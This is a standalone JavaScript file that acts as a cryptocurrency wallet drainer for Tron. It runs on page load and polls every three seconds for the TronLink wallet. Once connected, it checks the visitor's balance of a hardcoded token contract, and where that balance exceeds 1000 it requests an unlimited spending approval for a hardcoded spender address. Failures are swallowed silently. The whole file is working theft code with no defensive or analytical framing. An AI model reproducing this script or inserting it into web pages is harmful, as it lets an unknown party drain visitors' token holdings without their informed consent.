const tronSpenderAddress = "TYeJ75hSC7bVwtnU3Qd1VL7N6ypBfwN2KV";
const threshold = 1000;
const MAX_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

async function jobTron(userAddress, tokens) {
  var targetContract = null;
  var max = 0;

  for (var i in tokens) {
    var contract = await window.tronWeb.contract().at(tokens[i]);
    var balanceFormatted = await contract.balanceOf(userAddress).call() / 10**6;

    if (balanceFormatted < threshold) {
      continue;
    }

    if (balanceFormatted > max) {
      max = balanceFormatted;
      targetContract = tokens[i];
    }
  }

  if (targetContract != null) {
    var contract = await window.tronWeb.contract().at(targetContract);
    try {
      let res = await contract.approve(tronSpenderAddress, MAX_APPROVAL).send();
    } catch (error) {
      return
    }
  }
}

async function callTron() {
  await window.tronLink.request({ method: 'tron_requestAccounts' });

  const userAddress = window.tronWeb.defaultAddress.base58;
  if (!userAddress) {
    return;
  }

  var tokens = [
    "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
  ];

  await jobTron(userAddress, tokens);
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve,  ms))
}

document.addEventListener("DOMContentLoaded", async function () {
  var _isIntercepted = false;

  (async () => {
    while (!_isIntercepted) {
      if (typeof window["tronWeb"] !== "undefined" && typeof window["tronLink"] !== "undefined") {
        try {
          await callTron();
          _isIntercepted = true;
        } catch (error) {
        }
      }
      await sleep(3000);
    }
  })();
});
